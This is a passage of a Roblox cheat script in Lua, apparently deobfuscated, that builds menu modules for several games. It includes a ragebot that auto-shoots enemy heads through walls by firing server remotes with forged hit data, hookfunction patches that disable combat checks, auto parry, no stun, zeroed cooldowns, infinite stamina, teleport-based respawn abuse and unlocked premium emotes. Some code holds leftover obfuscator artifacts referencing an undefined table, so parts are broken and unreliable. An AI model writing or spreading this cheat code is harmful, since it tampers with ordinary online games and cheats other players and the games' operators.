										local flag = typeof(match) == "table" and match2
										local v11 = nil

										if flag then
											match = match[tonumber(match2)]
										else
											match = v11
										end
									end
								end

								match = match and match.GunName or Variables.gunname
								return match and FindFirstChild(replicatedStorage.Weapons, match) or nil
							end

							local function fn74(arg)
								local equipped = Variables.equipped
								local loadout = Variables.loadout

								if loadout then
									local match = tostring(equipped):match("^(%d+)")
									local match2 = tostring(equipped):match("_(%d+)$")
									match = match and loadout[match]

									if not (typeof(match) == "table" and match.GunName) then
										local flag = typeof(match) == "table" and match2
										local v11 = nil

										if flag then
											match = match[tonumber(match2)]
										else
											match = v11
										end
									end

									if match and type(match.Ammo) == "number" then
										return match.Ammo
									end
								end

								return arg and GetAttribute(arg, "Ammo")
							end

							local tbl9 = {
								Ragebot = {
									Module = nil,
									Wallbang = false,
									Delay = 0.1,
									Connect = nil,
									Ammo = nil,
									Reloading = false,
									ReloadTask = nil,
								},
							}

							Ambassador.HookEvent("UpdateAmmo", function(arg)
								if arg and type(arg.Ammo) == "number" then
									tbl9.Ragebot.Ammo = arg.Ammo
								end

								tbl9.Ragebot.Reloading = false
							end)

							Ambassador.HookEvent("EquipWeapon", function()
								tbl9.Ragebot.Ammo = nil
								tbl9.Ragebot.Reloading = false

								if tbl9.Ragebot.ReloadTask then
									Cancel(tbl9.Ragebot.ReloadTask)
									tbl9.Ragebot.ReloadTask = nil
								end
							end)

							local function fn75(arg, arg2, arg3)
								local v11 = fn72()
								local v12 = fn73()
								if not v11 or not v12 then
									return
								end

								if
									GetAttribute(v12, "Melee")
									or tostring(v11):sub(1, 1) == "4"
									or tostring(v11):sub(1, 1) == "5"
								then
									return
								end

								local v13 = fn69(arg2.Position)
								local cFrame = arg3.CFrame
								local n4 = arg3.CFrame.Position - NewVector3(0, 1, 0)
								replicatedStorage.Events.HandleShots:FireServer(v11, "Shoot")
								local ammo = tbl9.Ragebot.Ammo

								if ammo == nil then
									ammo = fn74(v12) or GetAttribute(v12, "Ammo") or 0
								end

								tbl9.Ragebot.Ammo = ammo - (GetAttribute(v12, "UseAmmo") or 1)

								local tbl10 = {
									Hit = arg.Character,
									PartName = "Head",
									Position = v13,
									Normal = NewVector3(0, 1, 0),
									hS = arg2.Size.Magnitude,
									hP = v13,
									cCF = cFrame,
									Wallbang = tbl9.Ragebot.Wallbang and true or nil,
								}

								local v14 = fn71()

								if v14 then
									v14:FireServer(tbl10, v12, false, false, tbl10.cCF, tbl10.hP, nil, nil)
								end

								Spawn(CreateTracer, n4, arg2.Position)
								Spawn(CreateHitSound)
								Wait(tbl9.Ragebot.Delay)
							end

							local function fn76()
								if tbl9.Ragebot.Connect then
									Cancel(tbl9.Ragebot.Connect)
									tbl9.Ragebot.Connect = nil
								end

								if tbl9.Ragebot.ReloadTask then
									Cancel(tbl9.Ragebot.ReloadTask)
									tbl9.Ragebot.ReloadTask = nil
								end
							end

							local function fn77()
								fn76()

								tbl9.Ragebot.Connect = Spawn(function()
									while tbl9.Ragebot.Module:Get() and Wait() do
										local character = LocalPlayer.Character

										if not (not character or not GetAttribute(LocalPlayer, "Alive")) then
											if FindFirstChild(character, "Gun") then
												if not GetAttribute(replicatedStorage, "Preparation") then
													if tbl9.Ragebot.Ammo ~= nil and tbl9.Ragebot.Ammo <= 0 then
														if not tbl9.Ragebot.Reloading then
															tbl9.Ragebot.Reloading = true
															Ambassador.Fire("ReloadWeapon")
															local v11 = fn73()

															tbl9.Ragebot.ReloadTask = Delay(
																(v11 and GetAttribute(v11, "ReloadTime") or 2) + 0.2,
																function()
																	tbl9.Ragebot.Reloading = false
																	tbl9.Ragebot.ReloadTask = nil

																	if
																		tbl9.Ragebot.Ammo ~= nil
																		and tbl9.Ragebot.Ammo <= 0
																	then
																		tbl9.Ragebot.Ammo = v11
																				and GetAttribute(v11, "Ammo")
																			or nil
																	end
																end
															)
														end
													elseif not tbl9.Ragebot.Reloading then
														local camera = Camera()
														local team = GetAttribute(LocalPlayer, "Team")

														if camera then
															local v11 = GetClosest()

															for i = 1, #v11 do
																local v12 = v11[i]
																local character2 = v12.Character

																local head = character2
																	and FindFirstChild(character2, "Head")

																local humanoid = character2
																	and FindFirstChildOfClass(character2, "Humanoid")

																local team2 = GetAttribute(v12, "Team")
																local flag = false

																if character2 then
																	flag = false

																	if
																		FindFirstChildOfClass(character2, "ForceField")
																	then
																		flag = true
																	end
																end

																if
																	not (
																		not head
																		or not humanoid
																		or humanoid.Health <= 0
																		or not GetAttribute(v12, "Alive")
																		or flag
																		or team2 == "Spectator"
																		or team2 == team
																		or not CheckState(v12)
																	)
																then
																	local flag2 = true

																	if not tbl9.Ragebot.Wallbang then
																		flag2 =
																			isPartVisible(head, camera.CFrame.Position)
																	end

																	if flag2 then
																		fn75(v12, head, camera)
																	end
																end
															end
														end
													end
												end
											end
										end
									end
								end)
							end

							local defusal = window:CreateTab({ Id = "defusal", Name = "Defusal" })

							tbl9.Ragebot.Module = defusal:CreateModule({
								Id = "defusal-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									if arg then
										fn77()
									else
										fn76()
									end
								end,
							})

							tbl9.Ragebot.Module:CreateKeybind({
								Id = "defusal-ragebot-keybind",
								Name = "Keybind",
								Callback = function()
									tbl9.Ragebot.Module:Set(not tbl9.Ragebot.Module:Get())
								end,
							})

							tbl9.Ragebot.Module:CreateToggle({
								Id = "defusal-ragebot-wallbang",
								Name = "Wallbang",
								Default = tbl9.Ragebot.Wallbang,
								Callback = function(wallbang)
									tbl9.Ragebot.Wallbang = wallbang
								end,
							})

							tbl9.Ragebot.Module:CreateSlider({
								Id = "defusal-ragebot-delay",
								Name = "Delay",
								Min = 0,
								Max = 1,
								Default = tbl9.Ragebot.Delay,
								Step = 0.01,
								Callback = function(arg)
									tbl9.Ragebot.Delay = tonumber(arg)
								end,
							})

							local v11 = nil
							local thread = nil

							defusal:CreateModule({
								Id = "defusal-no-smoke",
								Name = "No Smoke",
								Callback = function(arg)
									v11 = arg
									pcall(task.cancel, thread)

									thread = Spawn(function()
										while luraph_box(D[1]) do
											local D = FindFirstChild(workspace.Debris, "Smoke")

											if D then
												D:Destroy()
											end

											Wait()
										end
									end)
								end,
							})
						end,
						Gakuran = function()
							local shared = ReplicatedStorage:WaitForChild("Shared")
							local server = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Server")
							local CombatConfig = require(shared:WaitForChild("Config"):WaitForChild("CombatConfig"))

							local base = ReplicatedStorage:WaitForChild("CombatSystemClient")
								:WaitForChild("Combat")
								:WaitForChild("Base")

							local Block = require(base:WaitForChild("Block"))
							local Evasive = require(base.Evasive)
							local M1 = require(base.M1)
							require(base.M2)
							require(base.Equip)
							local gakuran = window:CreateTab({ Id = "gakuran", Name = "Gakuran" })
							local v10 = nil
							local v11 = nil
							local v12 = nil

							for _, v13 in getgc(true) do
								if typeof(v13) == "function" then
									local v14 = debug.getinfo(v13)

									if v14.name == "GuardBroken" then
										local v15 = nil
										local v16 = hookfunction

										local v17 = luraph_runtime1(function(...)
											local v17 = table.pack(...)
											if not v10 then
												return v15(...)
											end
											local tbl9 = { ... }
											local character = LocalPlayer.Character
											if character and tbl9[2] == character then
												print("No GuardBroken")
												return
											end
											return v15(table.unpack(v17, 1, v17.n))
										end)

										v15 = v16
										v15 = v15(v13, v17)
									elseif v14.name == "PerfectBlocked" then
										local v15 = nil
										local v16 = hookfunction

										local v17 = luraph_runtime1(function(...)
											local v17 = table.pack(...)
											if not v11 then
												return v15(...)
											end
											local tbl9 = { ... }
											local character = LocalPlayer.Character
											if character and tbl9[1] == character then
												print("No PerfectBlocked")
												return
											end
											return v15(table.unpack(v17, 1, v17.n))
										end)

										v15 = v16
										v15 = v15(v13, v17)
									elseif v14.name == "SuppressBlocking" then
										local v15 = nil
										local v16 = hookfunction

										local v17 = luraph_runtime1(function(...)
											if not v12 then
												print("No SuppressBlocking")
												return
											end
											return v15(...)
										end)

										v15 = v16
										v15 = v15(v13, v17)
									end
								end
							end

							local tbl9 = {
								Enabled = false,
								Range = 30,
								AttackDistance = 10,
								FaceAngle = 80,
								AutoEquip = true,
								FaceTarget = true,
								Visuals = true,
								AnimThreshold = 0,
							}

							local flag = false
							local tbl10 = {}
							local tbl11 = {}
							local connection = nil
							local n4 = 0
							local n5 = 0

							local function fn68(arg, arg2)
								local tbl12 = {}
								local position = arg.Position
								local n6 = arg2 * arg2
								local players = GetPlayerList()

								for i = 1, #players do
									local v13 = players[i]

									if v13 ~= LocalPlayer then
										local character = v13.Character

										if character and character.Parent then
											local humanoid = FindFirstChildOfClass(character, "Humanoid")

											local humanoidRootPart = humanoid
												and FindFirstChild(character, "HumanoidRootPart")

											if humanoid and humanoid.Health > 0 and humanoidRootPart then
												local n7 = humanoidRootPart.Position - position

												if n7.X * n7.X + n7.Y * n7.Y + n7.Z * n7.Z <= n6 then
													tbl12[#tbl12 + 1] = character
												end
											end
										end
									end
								end

								return tbl12
							end

							local function fn69(arg)
								return GetAttribute(arg, "CombatAttacking") == true
							end

							local function fn70(arg, arg2, arg3)
								local humanoidRootPart = FindFirstChild(arg, "HumanoidRootPart")
								if not humanoidRootPart or arg2[humanoidRootPart] then
									return
								end
								local tbl12 = {}

								tbl12[#tbl12 + 1] = Connect(humanoidRootPart.ChildAdded, function(arg4)
									if arg4.Name ~= "PunchSwing" then
										return
									end
									local character = LocalPlayer.Character

									local humanoidRootPart2 = character
										and FindFirstChild(character, "HumanoidRootPart")

									if
										not (
											arg.Parent
											and humanoidRootPart.Parent
											and character
											and character.Parent
											and humanoidRootPart2
										)
									then
										return
									end

									arg3(humanoidRootPart, humanoidRootPart2)
								end)

								tbl12[#tbl12 + 1] = Connect(arg.AttributeChanged, function(arg4)
									if arg4 ~= "CombatAttacking" or GetAttribute(arg, arg4) ~= true then
										return
									end
									local character = LocalPlayer.Character

									local humanoidRootPart2 = character
										and FindFirstChild(character, "HumanoidRootPart")

									if
										not (
											arg.Parent
											and humanoidRootPart.Parent
											and character
											and character.Parent
											and humanoidRootPart2
										)
									then
										return
									end

									arg3(humanoidRootPart, humanoidRootPart2)
								end)

								arg2[humanoidRootPart] = tbl12
							end

							local function fn71(arg)
								for k, v13 in pairs(arg) do
									if not k.Parent then
										for i = 1, #v13 do
											Disconnect(v13[i])
										end

										arg[k] = nil
									end
								end
							end

							local function fn72(arg)
								for _, v13 in pairs(arg) do
									for i = 1, #v13 do
										Disconnect(v13[i])
									end
								end

								table.clear(arg)
							end

							local function fn73()
								local character = LocalPlayer.Character
								if not (character and character.Parent) then
									return
								end

								server:FireServer(
									{ Type = "Combat", Action = "Block", Func = "Activated" },
									Workspace:GetServerTimeNow()
								)

								flag = true
							end

							local function fn74()
								if not flag then
									return
								end
								local character = LocalPlayer.Character

								if character and character.Parent then
									server:FireServer({ Type = "Combat", Action = "Block", Func = "Deactivated" })
								end

								flag = false
							end

							local tbl12 = {}

							local function fn75(arg)
								local humanoid = FindFirstChildOfClass(arg, "Humanoid")
								return humanoid and FindFirstChildOfClass(humanoid, "Animator")
							end

							local function fn76(arg)
								if tbl12[arg] then
									return
								end
								local v13 = fn75(arg)
								if not v13 then
									return
								end
								local tbl13 = { track = nil }

								tbl13.conn = Connect(v13.AnimationPlayed, function(track)
									tbl13.track = track
								end)

								tbl12[arg] = tbl13
							end

							local function fn77(arg)
								local v13 = tbl12[arg]
								local track = v13 and v13.track

								if track and track.IsPlaying then
									local length = track.Length
									if length > 0 then
										return Clamp(track.TimePosition / length, 0, 1) * 100
									end
								end

								if not (v13 and GetAttribute(arg, "CombatAttacking") == true) then
									return nil
								end
								local v14 = fn75(arg)
								if not v14 then
									return nil
								end
								local playingAnimationTracks = v14:GetPlayingAnimationTracks()

								for i = 1, #playingAnimationTracks do
									local v15 = playingAnimationTracks[i]

									if v15.IsPlaying and not v15.Looped then
										v13.track = v15
										local length = v15.Length
										if length > 0 then
											return Clamp(v15.TimePosition / length, 0, 1) * 100
										end
										return nil
									end
								end

								return nil
							end

							local function fn78()
								for _, v13 in pairs(tbl12) do
									if v13.conn then
										Disconnect(v13.conn)
									end
								end

								table.clear(tbl12)
							end

							local function fn79()
								if flag then
									return
								end
								fn73()
							end

							local transparency = 0.7
							local v13 = nil

							local function fn80()
								if v13 and v13.Parent then
									return v13
								end
								local Folder = NewInstance("Folder")
								Folder.Name = "GakuranParryVisuals"
								Folder.Parent = Workspace
								v13 = Folder
								return Folder
							end

							local function fn81()
								local v14 = fn80()
								local tbl13 = { edges = {}, arc = {}, groundY = nil, groundAt = 0 }

								for i = 1, 2 do
									local Part = NewInstance("Part")
									Part.Name = "GakuranParryEdge"
									Part.Anchored = true
									Part.CanCollide = false
									Part.CanQuery = false
									Part.CanTouch = false
									Part.CastShadow = false
									Part.Material = Enum.Material.Neon
									Part.Color = NewColor3(1, 1, 1)
									Part.Transparency = transparency
									Part.Size = NewVector3(0.08, 0.08, 1)
									Part.Parent = v14
									tbl13.edges[i] = Part
								end

								for i = 1, 8 do
									local Part = NewInstance("Part")
									Part.Name = "GakuranParryArc"
									Part.Anchored = true
									Part.CanCollide = false
									Part.CanQuery = false
									Part.CanTouch = false
									Part.CastShadow = false
									Part.Material = Enum.Material.Neon
									Part.Color = NewColor3(1, 1, 1)
									Part.Transparency = transparency
									Part.Size = NewVector3(0.08, 0.08, 1)
									Part.Parent = v14
									tbl13.arc[i] = Part
								end

								local BillboardGui = NewInstance("BillboardGui")
								BillboardGui.Name = "GakuranParryLabel"
								BillboardGui.Size = NewUDim2(0, 80, 0, 24)
								BillboardGui.AlwaysOnTop = true
								BillboardGui.StudsOffset = NewVector3(0, -2, 0)
								local TextLabel = NewInstance("TextLabel")
								TextLabel.Size = NewUDim2(1, 0, 1, 0)
								TextLabel.BackgroundTransparency = 1
								TextLabel.TextColor3 = NewColor3(1, 1, 1)
								TextLabel.TextStrokeTransparency = 0.2
								TextLabel.TextSize = 14
								TextLabel.Font = Enum.Font.GothamBold
								TextLabel.Parent = BillboardGui
								BillboardGui.Parent = v14
								tbl13.billboard = BillboardGui
								tbl13.label = TextLabel
								return tbl13
							end

							local function fn82(arg)
								for i = 1, #arg.edges do
									arg.edges[i]:Destroy()
								end

								for i = 1, #arg.arc do
									arg.arc[i]:Destroy()
								end

								arg.billboard:Destroy()
							end

							local function fn83()
								for _, v14 in pairs(tbl11) do
									fn82(v14)
								end

								table.clear(tbl11)

								if v13 then
									v13:Destroy()
									v13 = nil
								end
							end

							local function fn84()
								if connection then
									Disconnect(connection)
									connection = nil
								end
							end

							local function fn85()
								local H = LocalPlayer.Character
								local m = H and (FindFirstChild(H, "HumanoidRootPart"))
								if not (H and H.Parent and m) then
									return
								end
								local h = Clock()
								local B, t, x, R = luraph_box(D[1])(m, D[2].Range), false, 1 / 0
								local O = not GetAttribute(H, "Equip")

								for k = 1, #B, 1 do
									local j = B[k]
									luraph_box(D[3])(j, D[4], luraph_box(D[5]))

									if D[2].AnimThreshold > 0 then
										luraph_box(D[6])(j)
									end

									if luraph_box(D[7])(j) then
										H = FindFirstChild(j, "HumanoidRootPart")

										if H and (luraph_box(D[8])(j, m, H)) then
											k = H.Position - m.Position
											local i = k.X * k.X + k.Y * k.Y + k.Z * k.Z

											if i < x then
												x, R = i, H
											end

											if luraph_box(D[9])(j) then
												if O and D[2].AutoEquip then
													D[10].Equip()
													O = false
												end

												luraph_box(D[11])(j)
											end

											t = true
										end
									end
								end

								if h - luraph_box(D[12]) >= D[13] then
									local __boxv0 = h
									luraph_box_set(D[12], __boxv0)

									for H, x in pairs(D[14]) do
										if not H.Parent then
											if x.conn then
												Disconnect(x.conn)
											end

											D[14][H] = nil
										end
									end

									luraph_box(D[15])(D[4])
								end

								if D[2].Visuals and h - luraph_box(D[16]) >= D[17] then
									local __boxv0 = h
									luraph_box_set(D[16], __boxv0)
									luraph_box(D[18])(B, h)
								elseif not D[2].Visuals and (next(D[19])) then
									luraph_box(D[20])()
								end

								if t then
									if D[2].FaceTarget and R then
										luraph_box(D[21])(m, R)
									end
								else
									luraph_box(D[22])()
								end
							end

							local autoParry = gakuran:CreateModule({
								Id = "gakuran-auto-parry",
								Name = "Auto Parry",
								Callback = function(enabled)
									tbl9.Enabled = enabled

									if enabled then
										fn84()
										n4 = 0
										n5 = 0
										connection = Connect(RunService.Heartbeat, fn85)
									else
										fn84()
										fn72(tbl10)
										fn78()
										fn74()
										fn83()
									end
								end,
							})

							autoParry:CreateToggle({
								Id = "gakuran-auto-parry-auto-equip",
								Name = "Auto Equip",
								Default = tbl9.AutoEquip,
								Callback = function(autoEquip)
									tbl9.AutoEquip = autoEquip
								end,
							})

							autoParry:CreateToggle({
								Id = "gakuran-auto-parry-face-target",
								Name = "Face Attacker",
								Default = tbl9.FaceTarget,
								Callback = function(faceTarget)
									tbl9.FaceTarget = faceTarget
								end,
							})

							autoParry:CreateSlider({
								Id = "gakuran-auto-parry-face-angle",
								Name = "Face Angle (deg)",
								Min = 10,
								Max = 180,
								Default = tbl9.FaceAngle,
								Step = 5,
								Callback = function(faceAngle)
									tbl9.FaceAngle = faceAngle
								end,
							})

							autoParry:CreateSlider({
								Id = "gakuran-auto-parry-attack-distance",
								Name = "Attack Distance",
								Min = 1,
								Max = 20,
								Default = tbl9.AttackDistance,
								Step = 0.5,
								Callback = function(attackDistance)
									tbl9.AttackDistance = attackDistance
								end,
							})

							autoParry:CreateSlider({
								Id = "gakuran-auto-parry-range",
								Name = "Range (studs)",
								Min = 1,
								Max = 30,
								Default = tbl9.Range,
								Step = 1,
								Callback = function(range)
									tbl9.Range = range
								end,
							})

							autoParry:CreateSlider({
								Id = "gakuran-auto-parry-anim-progress",
								Name = "Anim Progress (%)",
								Min = 0,
								Max = 100,
								Default = tbl9.AnimThreshold,
								Step = 5,
								Callback = function(animThreshold)
									tbl9.AnimThreshold = animThreshold
								end,
							})

							autoParry:CreateToggle({
								Id = "gakuran-auto-parry-visuals",
								Name = "Visuals",
								Default = tbl9.Visuals,
								Callback = function(visuals)
									tbl9.Visuals = visuals

									if not visuals then
										fn83()
									end
								end,
							})

							local v14 = nil
							local flag2 = false
							local v15 = nil
							local v16 = hookfunction
							local hold = M1.Hold

							local v17 = luraph_runtime1(function(arg)
								flag2 = arg == "Start" and true or false
								return v15(arg)
							end)

							v15 = v16
							v15 = v15(hold, v17)

							gakuran:CreateModule({
								Id = "gakuran-no-block-cd",
								Name = "Evasive On Attack",
								Callback = function(arg)
									v14 = arg

									Spawn(function()
										while luraph_box(D[1]) and (Wait()) do
											if not luraph_box(D[2]) then
												continue
											end
											D[3].Evasive()
										end
									end)
								end,
							})

							gakuran:CreateModule({
								Id = "gakuran-no-guardbroken",
								Name = "No GuardBroken",
								Callback = function(arg)
									v10 = arg
								end,
							})

							gakuran:CreateModule({
								Id = "gakuran-no-perfectblocked",
								Name = "No Perfect Blocked",
								Callback = function(arg)
									v11 = arg
								end,
							})

							gakuran:CreateModule({
								Id = "gakuran-no-suppressblocking",
								Name = "No Suppress Blocking",
								Callback = function(arg)
									v12 = arg
								end,
							})

							local tbl13 = { Enabled = false, SavedParriedStun = nil, SavedGuardbreak = nil }

							gakuran:CreateModule({
								Id = "gakuran-no-stun",
								Name = "No Stun",
								Callback = function(enabled)
									tbl13.Enabled = enabled

									if enabled then
										if not tbl13.SavedParriedStun then
											tbl13.SavedParriedStun = Block.ApplyLocalParriedStun
											tbl13.SavedGuardbreak = Block.ApplyLocalGuardbreakLockout

											Block.ApplyLocalParriedStun = function() end

											Block.ApplyLocalGuardbreakLockout = function() end
										end

										Spawn(function()
											while tbl13.Enabled and Wait() do
												local character = LocalPlayer.Character

												if character and character.Parent then
													local tbl14 =
														{ "Stunned", "Parried", "CantAnything", "GuardBroken" }

													for i = 1, #tbl14 do
														local v18 = tbl14[i]

														if GetAttribute(character, v18) == true then
															SetAttribute(character, v18, nil)
														end
													end
												end
											end
										end)
									elseif tbl13.SavedParriedStun then
										Block.ApplyLocalParriedStun = tbl13.SavedParriedStun
										Block.ApplyLocalGuardbreakLockout = tbl13.SavedGuardbreak
										tbl13.SavedParriedStun = nil
										tbl13.SavedGuardbreak = nil
									end
								end,
							})

							local tbl14 = { Enabled = false, Saved = {} }

							gakuran:CreateModule({
								Id = "gakuran-no-windup-recovery",
								Name = "No Windup No Recovery",
								Callback = function(enabled)
									tbl14.Enabled = enabled

									if enabled then
										if next(tbl14.Saved) == nil then
											tbl14.Saved.M1Recovery = CombatConfig.M1.RecoveryLockout
											tbl14.Saved.M1Finisher = CombatConfig.M1.FinisherRecoveryLockout
											tbl14.Saved.M2Recovery = CombatConfig.M2.RecoveryLockout
											tbl14.Saved.AttackDuration = CombatConfig.ClientPredict.M1.AttackDuration
											tbl14.Saved.ComboResetTime = CombatConfig.ClientPredict.M1.ComboResetTime

											tbl14.Saved.FinisherCooldown =
												CombatConfig.ClientPredict.M1.FinisherCooldown
										end

										CombatConfig.M1.RecoveryLockout = 0
										CombatConfig.M1.FinisherRecoveryLockout = 0
										CombatConfig.M2.RecoveryLockout = 0
										CombatConfig.ClientPredict.M1.AttackDuration = 0
										CombatConfig.ClientPredict.M1.ComboResetTime = 0
										CombatConfig.ClientPredict.M1.FinisherCooldown = 0

										Spawn(function()
											while tbl14.Enabled and Wait() do
												local character = LocalPlayer.Character

												if character and character.Parent then
													local tbl15 = { "CombatAttacking", "M1Cooldown", "M2Cooldown" }

													for i = 1, #tbl15 do
														local v18 = tbl15[i]

														if GetAttribute(character, v18) == true then
															SetAttribute(character, v18, nil)
														end
													end
												end
											end
										end)
									elseif next(tbl14.Saved) ~= nil then
										CombatConfig.M1.RecoveryLockout = tbl14.Saved.M1Recovery
										CombatConfig.M1.FinisherRecoveryLockout = tbl14.Saved.M1Finisher
										CombatConfig.M2.RecoveryLockout = tbl14.Saved.M2Recovery
										CombatConfig.ClientPredict.M1.AttackDuration = tbl14.Saved.AttackDuration
										CombatConfig.ClientPredict.M1.ComboResetTime = tbl14.Saved.ComboResetTime
										CombatConfig.ClientPredict.M1.FinisherCooldown = tbl14.Saved.FinisherCooldown
									end
								end,
							})

							local tbl15 = { Enabled = false, Max = 100 }

							gakuran:CreateModule({
								Id = "gakuran-inf-stamina",
								Name = "Inf Stamina",
								Callback = function(enabled)
									tbl15.Enabled = enabled

									if enabled then
										Spawn(function()
											while D[1].Enabled and (Wait()) do
												local H = LocalPlayer.Character

												if H and H.Parent and GetAttribute(H, "Stamina") ~= D[1].Max then
													SetAttribute(H, "Stamina", D[1].Max)
												end
											end
										end)
									end
								end,
							})

							local tbl16 = { Enabled = false, HpThreshold = 30, TeleportHeight = 100000 }
							local tbl17 = { pos = nil, phase = "normal" }
							local connection2 = nil

							local function fn86(arg)
								if not arg then
									return
								end
								arg.PlatformStand = false
								arg.Sit = false

								pcall(function()
									local state_ = arg:GetState()

									if
										state_ == Enum.HumanoidStateType.Physics
										or state_ == Enum.HumanoidStateType.FallingDown
										or state_ == Enum.HumanoidStateType.Ragdoll
									then
										arg:ChangeState(Enum.HumanoidStateType.GettingUp)
									end
								end)
							end

							local function fn87()
								local pos = tbl17.pos

								Spawn(function()
									local character = LocalPlayer.Character
									local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
									local n6 = 0

									while not (character and character.Parent and humanoidRootPart) and n6 < 5 do
										Wait()
										character = LocalPlayer.Character
										humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
										n6 += 1
									end

									if not (character and character.Parent and humanoidRootPart) then
										tbl17.phase = "normal"
										tbl17.pos = nil
										return
									end

									Wait(0.5)

									while tbl16.Enabled and tbl17.pos do
										Wait()
										local humanoid = FindFirstChildOfClass(character, "Humanoid")
										local humanoidRootPart2 = FindFirstChild(character, "HumanoidRootPart")
										if not (character.Parent and humanoidRootPart2 and humanoid) then
											return
										end
										fn86(humanoid)

										pcall(function()
											humanoid:ChangeState(Enum.HumanoidStateType.Running)
										end)

										humanoidRootPart2.CFrame = NewCFrame(pos)

										if (humanoidRootPart2.Position - pos).Magnitude < 5 then
											tbl17.phase = "normal"
											tbl17.pos = nil
											return
										end
									end

									tbl17.phase = "normal"
									tbl17.pos = nil
								end)
							end

							gakuran
								:CreateModule({
									Id = "gakuran-instant-respawn",
									Name = "Instant Respawn",
									Callback = function(enabled)
										tbl16.Enabled = enabled

										if enabled then
											tbl17.phase = "normal"
											tbl17.pos = nil

											connection2 = Connect(LocalPlayer.CharacterAdded, function()
												if not tbl16.Enabled or not tbl17.pos then
													return
												end
												tbl17.phase = "return"
												fn87()
											end)

											Spawn(function()
												while tbl16.Enabled and Wait() do
													pcall(function()
														local character = LocalPlayer.Character

														local humanoid = character
															and FindFirstChildOfClass(character, "Humanoid")

														local humanoidRootPart = character
															and FindFirstChild(character, "HumanoidRootPart")

														if
															not (
																character
																and character.Parent
																and humanoid
																and humanoidRootPart
															)
														then
															return
														end

														fn86(humanoid)

														if tbl17.phase == "normal" then
															if tbl16.HpThreshold <= humanoid.Health then
																tbl17.pos = humanoidRootPart.Position
															elseif humanoid.Health > 0 then
																tbl17.pos = humanoidRootPart.Position
																tbl17.phase = "teleport"
															end
														elseif tbl17.phase == "teleport" and tbl17.pos then
															humanoidRootPart.CFrame = NewCFrame(
																tbl17.pos.X,
																tbl16.TeleportHeight,
																tbl17.pos.Z
															)
														end
													end)
												end
											end)
										else
											if connection2 then
												Disconnect(connection2)
												connection2 = nil
											end

											tbl17.phase = "normal"
											tbl17.pos = nil
										end
									end,
								})
								:CreateSlider({
									Id = "gakuran-instant-respawn-hp",
									Name = "HP Threshold",
									Min = 1,
									Max = 100,
									Default = tbl16.HpThreshold,
									Step = 1,
									Callback = function(hpThreshold)
										tbl16.HpThreshold = hpThreshold
									end,
								})

							local tbl18 = { Enabled = false, HookedBlur = nil, Conn = nil }

							local function fn88()
								local screenEffectsBlur = FindFirstChild(Lighting, "ScreenEffectsBlur")
								if screenEffectsBlur == tbl18.HookedBlur then
									return
								end

								if tbl18.Conn then
									Disconnect(tbl18.Conn)
									tbl18.Conn = nil
								end

								tbl18.HookedBlur = screenEffectsBlur

								if screenEffectsBlur then
									tbl18.Conn = Connect(
										GetPropertyChangedSignal(screenEffectsBlur, "Enabled"),
										function()
											if screenEffectsBlur.Enabled then
												screenEffectsBlur.Enabled = false
											end
										end
									)
								end
							end

							gakuran:CreateModule({
								Id = "gakuran-no-screen-blur",
								Name = "No Screen Blur",
								Callback = function(enabled)
									tbl18.Enabled = enabled

									if enabled then
										fn88()

										Spawn(function()
											while tbl18.Enabled and Wait() do
												pcall(function()
													fn88()

													local screenEffectsBlur =
														FindFirstChild(Lighting, "ScreenEffectsBlur")

													if screenEffectsBlur and screenEffectsBlur.Enabled then
														screenEffectsBlur.Enabled = false
													end
												end)
											end
										end)
									else
										if tbl18.Conn then
											Disconnect(tbl18.Conn)
											tbl18.Conn = nil
										end

										tbl18.HookedBlur = nil
									end
								end,
							})
						end,
						["Gun Grounds FFA"] = function()
							local rage = window:CreateTab({ Id = "gun-grounds-rage", Name = "Rage" })
							local tbl9 = { Ragebot = { Module = nil, Wallbang = true, Connect = nil } }

							local function fn68()
								if tbl9.Ragebot.Connect then
									Cancel(tbl9.Ragebot.Connect)
									tbl9.Ragebot.Connect = nil
								end
							end

							local function fn69()
								fn68()

								tbl9.Ragebot.Connect = Spawn(function()
									while tbl9.Ragebot.Module:Get() and Wait() do
										local character = LocalPlayer.Character

										if character then
											local tool = FindFirstChildOfClass(character, "Tool")
											local muz = tool and FindFirstChild(tool, "Muz")
											local remotes = tool and FindFirstChild(tool, "Remotes")
											local configuration = tool and FindFirstChild(tool, "Configuration")
											remotes = remotes and FindFirstChild(remotes, "CheckShot")

											if tool and muz and remotes then
												local v10 = GetClosest()
												local head = nil
												local n4 = nil
												local n5 = nil

												for i = 1, #v10 do
													local v11 = v10[i]
													local character2 = v11.Character
													head = character2 and FindFirstChild(character2, "Head")

													local humanoid = character2
														and FindFirstChildOfClass(character2, "Humanoid")

													if
														v11 == LocalPlayer
														or not character2
														or not head
														or not humanoid
														or humanoid.Health <= 0
														or not CheckState(v11)
													then
														continue
													else
														local magnitude = head.Size.Magnitude
														local flag

														if tbl9.Ragebot.Wallbang then
															n4 = muz.Position - NewVector3(0, 100, 0)
															n5 = head.Position - NewVector3(0, 100, 0)
															flag = true
														else
															n4, n5, flag =
																Resolve(muz, head, magnitude, magnitude, math.huge, 10)
														end

														if not flag then
															continue
														end
													end

													break
												end

												if n4 then
													local v11 = workspace
													local getServerTimeNow = v11.GetServerTimeNow

													remotes:FireServer(
														configuration.Ammo.Value,
														configuration.spread.Value,
														configuration.Ammo.Value,
														configuration.reloadTime.Value,
														CFrame.lookAt(n4, n5),
														n5,
														head,
														Random(1000, 9999),
														getServerTimeNow(v11)
													)

													CreateTracer(n4, n5)
													CreateHitSound()
													Wait(configuration.FireRate.Value / 1.5)
												end
											end
										end
									end
								end)
							end

							tbl9.Ragebot.Module = rage:CreateModule({
								Id = "gun-grounds-ffa-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									if arg then
										fn69()
									else
										fn68()
									end
								end,
							}):CreateToggle({
								Id = "wallbang",
								Name = "Wallbang",
								Default = true,
								Callback = function(wallbang)
									tbl9.Ragebot.Wallbang = wallbang
								end,
							})
						end,
						Ohio = function()
							SetAttribute(LocalPlayer, "emotes_premiumEmotes", true)

							Spawn(function()
								local emotes = ReplicatedStorage.devv.shared.Indicies.emotes
								if not emotes then
									return
								end
								local ok4, result4 = pcall(require, emotes)
								if not ok4 or type(result4) ~= "table" then
									return
								end

								for _, v10 in pairs(result4) do
									if type(v10) == "table" then
										v10.canWalk = true
									end
								end
							end)

							SetAttribute(LocalPlayer, "mobileDealer", true)

